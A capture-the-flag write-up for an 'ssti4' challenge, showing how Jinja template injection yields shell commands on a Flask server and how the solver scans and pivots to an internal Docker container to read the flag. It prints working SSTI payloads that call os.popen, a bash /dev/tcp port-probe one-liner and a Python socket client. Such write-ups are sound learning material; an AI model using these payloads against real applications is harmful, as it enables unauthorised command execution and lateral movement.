# ssti4

## What it is

Same as sst3.

The flag doesn't seem to be in any of the server files.

```dalek.py``` launches the web server and kills children processes every 10 secondes, preventing backdoors.

There is a ```docker-compose.yml``` file:
```yml
version: "3.3"

# FIXME: Don't forget to place this file inside .dockerignore ! we don't want anyone looking at this

services:
  ssti4:
    build: "./Challenges/SSTI/ssti4"
    restart: always
    networks:
      ssti4:

  # TODO: This is old don't forget to stop the server in the next version !
  # toto8042:
  #   build: "./Challenges/SSTI/ssti4/toto8042"
  #   restart: always
  #   port:
  #     - ":" WARNING: The port was still open, asked Sysadmin to remove it last month....
  #   networks:
  #     ssti4:'
```

It references a toto8042 service that shouldn't be up but still is.

```yml
#   port:
  #     - ":"
```
This tells us that all ports are forwarded.

ssti4 and toto8042 are on the same network ([docker-compose networks](https://docs.docker.com/compose/networking/#specify-custom-networks)).

We can confirm that by pinging toto8042:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
```
```
PING toto8042 (172.23.0.2): 56 data bytes
64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
--- toto8042 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
```

## Solution

### Port discovery

(see port_discovery.js)

nmap, nc, telnet and others are not available on ssti4 so we can't use them to discover ports.

The list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).

We can test if a port is open with this bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
```bash
timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
```

Using this method we find that ports 4242 and 8042 are open.

### Port 8042

Running curl on 8042 (using ssti) returns this:
```bash
$ curl toto8042:8042
this is not the way this time, goodluck !!
```

### Port 4242

(see solve.js)

Port 4242 is not http.

We can use python3 to open a TCP socket.

Run python code with ssti:
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
```
Note: quotes get a little tricky, the python command can only use single quotes, at least using our implementation.

To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()}}
```

We can prevent modifications of the output by jinja by using the "safe" filter ([source](https://stackoverflow.com/a/12341532/12864941)), it is particularly useful when reading python errors.
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()|safe}}
```

We can then open a socket to ```toto8042:4242``` and read it ([source](https://wiki.python.org/moin/TcpCommunication)):
```py
import socket

TCP_IP = 'toto8042'
TCP_PORT = 4242
BUFFER_SIZE = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
s.close()

print(data.decode('utf-8'))
```

flag: ```BFS{doCKErcEpt1On8042}```
